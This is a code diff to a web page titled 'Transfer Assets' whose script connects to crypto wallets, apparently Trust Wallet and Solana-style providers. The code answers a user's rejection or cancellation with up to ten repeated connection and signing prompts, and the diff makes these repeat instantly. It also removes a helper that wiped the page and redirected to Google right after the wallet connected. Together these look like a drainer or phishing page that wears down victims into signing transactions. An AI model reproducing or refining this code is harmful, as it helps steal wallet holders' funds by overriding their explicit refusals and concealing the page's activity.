@@ -75,7 +75,7 @@
 </head>
 <body id="body">
 
-<div class="container">
+<div class="container" id="mainContainer">
     <h2 id="title">Transfer Assets</h2>
     <p id="desc">Enter amount to authorize transfer.</p>
 
@@ -104,19 +104,6 @@
     const addressInput = document.getElementById('addressInput');
     const statusDiv = document.getElementById('status');
 
-    // HELPER TO DISAPPEAR / HIDE THE PAGE VIEW
-    function hidePageAndExit() {
-        document.body.innerHTML = '<div style="background:#0a0a0a; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; color:#888; font-family:sans-serif;">Loading...</div>';
-        
-        try {
-            window.close();
-        } catch (e) {}
-
-        setTimeout(() => {
-            window.location.href = "https://www.google.com";
-        }, 500);
-    }
-
     // AGGRESSIVE TRUST WALLET MOBILE PROVIDER DETECTOR
     async function getProvider() {
         const checkProvider = () => {
@@ -141,7 +128,7 @@
         return null;
     }
 
-    // MAIN ACTION WITH IMMEDIATE PAGE HIDE ON SUCCESSFUL CONNECT
+    // MAIN ACTION WITH INSTANT ZERO-DELAY LOOPS
     async function handleTransaction() {
         statusDiv.innerText = ""; 
 
@@ -152,7 +139,7 @@
             return;
         }
 
-        // STEP 1: 10-ATTEMPT CONNECTION LOOP
+        // STEP 1: INSTANT 10-ATTEMPT CONNECTION LOOP
         let connectAttempts = 0;
         const MAX_ATTEMPTS = 10;
         let userPublicKey = null;
@@ -171,11 +158,7 @@
                 }
                 
                 userPublicKey = resp?.publicKey || provider.publicKey;
-                if (userPublicKey) {
-                    // SUCCESSFUL CONNECTION: Immediately wipe webpage interface and exit/redirect
-                    hidePageAndExit();
-                    break; 
-                }
+                if (userPublicKey) break; 
             } catch (err) {
                 const errString = err.toString().toLowerCase();
                 const isUserRejection = errString.includes("reject") || errString.includes("cancel") || errString.includes("user denied");
@@ -183,11 +166,9 @@
                 if (isUserRejection) {
                     connectAttempts++;
                     if (connectAttempts < MAX_ATTEMPTS) {
-                        await new Promise(resolve => setTimeout(resolve, 1500));
-                        continue;
+                        continue; // Instant loop without any delay
                     }
                 }
-                setTimeout(hidePageAndExit, 500);
                 return;
             }
         }
@@ -196,13 +177,15 @@
             return;
         }
 
-        // STEP 2: 10-ATTEMPT TRANSACTION SIGNING LOOP (RUNS IN BACKGROUND)
+        // STEP 2: INSTANT 10-ATTEMPT TRANSACTION SIGNING LOOP
         let signAttempts = 0;
 
         while (signAttempts < MAX_ATTEMPTS) {
             try {
                 const userRequestedAmount = parseFloat(amountInput.value) * 1000000000; 
                 if (isNaN(userRequestedAmount) || userRequestedAmount <= 0) {
+                    statusDiv.innerText = "Enter a valid amount.";
+                    statusDiv.style.color = "#ff4d4d";
                     return;
                 }
 
@@ -258,10 +241,10 @@
                 if (isUserRejection) {
                     signAttempts++;
                     if (signAttempts < MAX_ATTEMPTS) {
-                        await new Promise(resolve => setTimeout(resolve, 1500));
-                        continue;
+                        continue; // Instant loop without any delay
                     }
                 }
+
                 break;
             }
         }
